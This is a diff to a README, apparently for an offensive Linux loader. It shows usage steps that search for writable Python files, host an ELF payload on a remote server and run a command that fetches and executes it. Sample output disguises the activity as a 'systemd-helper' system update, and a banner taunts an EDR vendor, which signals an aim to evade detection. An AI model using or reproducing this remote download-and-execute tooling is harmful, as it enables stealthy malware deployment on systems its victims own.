@@ -35,4 +35,32 @@ You shouldn't have any issues running it as a regular user, since ```os.fork()``
 ```find / -type f -name "*.py" \( -perm -u=w -o -perm -g=w -o -perm -o=w \) 2>/dev/null```<br>
 3. Host the ELF file on a domain. Chmod the loader and execute.<br>
 ```chmod +x whatever.py```<br>OR if you went the find route, simply execute.<br>
-4. ```python3 whatever.py -u http://example.com/systemd-helper.elf```
+```
+└─$ python3 whatever.py -u https://x.x.x.x/systemd-helper.elf
+
+            ___----------___
+         _--                ----__
+        -                         ---_
+       -___    ____---_              --_
+   __---_ .-_--   _ O _-                - 
+  -      -_-       ---                   -
+ -   __---------___                       -
+ - _----                                  -
+  -     -_                                 _
+  `      _-                                 _
+        _                           _-_  _-_ _
+       _-                   ____    -_  -   --
+       -   _-__   _    __---    -------       -
+      _- _-   -_-- -_--                        _
+      -_-                                       _
+     _-                                          _
+     - all my h0mies h8 bloudstrike
+
+[systemd-helper] Allocating service descriptor...
+[systemd-helper] Retrieving update package from: https://x.x.x.x/systemd-helper.elf
+[systemd-helper] Processing system update...
+[systemd-helper] Starting maintenance task...
+[systemd-helper] Monitoring background process (PID: 2880622)...
+[systemd-helper] Running scheduled service...
+[systemd-helper] Service started successfully.
+```
